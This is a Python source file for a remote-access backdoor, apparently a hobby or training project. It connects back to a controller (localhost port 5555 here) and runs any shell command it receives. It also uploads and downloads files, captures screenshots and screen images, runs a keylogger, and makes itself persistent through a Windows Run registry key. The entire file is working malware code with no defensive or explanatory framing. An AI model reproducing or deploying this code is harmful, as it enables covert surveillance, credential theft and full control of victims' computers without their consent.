import socket
import json
import subprocess
import os
import shutil
import sys
import time
import pyautogui
import keylogger
import threading
import cv2
import numpy as np


def screenrecord():
    # Specify resolution
    resolution = tuple(pyautogui.size())

    # Specify video codec
    codec = cv2.VideoWriter_fourcc(*"XVID")

    # Specify name of Output file
    filename = "Recording.avi"

    # Specify frames rate. We can choose any
    # value and experiment with it
    fps = 60.0

    # Creating a VideoWriter object
    out = cv2.VideoWriter(filename, codec, fps, resolution)
    return out


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    # s.close()


def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


def screenshot():
    myscreenshot = pyautogui.screenshot()
    myscreenshot.save('screen.png')


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:12] == 'screenrecord':

            while True:
                # Take screenshot using PyAutoGUI
                img = pyautogui.screenshot()
                reliable_send(img)

        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start())
            t.start()
            reliable_send('[+] Keylogger started')

        elif command[:11] == 'keylog_stop':
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_dump':
            keylog.self_destruct()
            t.join()
            reliable_send('[+] keylogger stopped!!!')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        elif command == 'help':
            pass
        else:
            execute = subprocess.Popen(command, shell=True,
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)
        # subprocess.call(["shutdown", "/1"])


def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('127.0.0.1', 5555))
            shell()
            s.close()
            break
        except:
            connection()


def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' +
                            reg_name + ' /t REG_SZ /d "' + file_location + '"')
            reliable_send('[+] created persistence reg key: ' + reg_name)

        else:
            reliable_send('[+] persistence already existed')
    except:
        reliable_send('[-] Error creating persistence to the target machine')


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
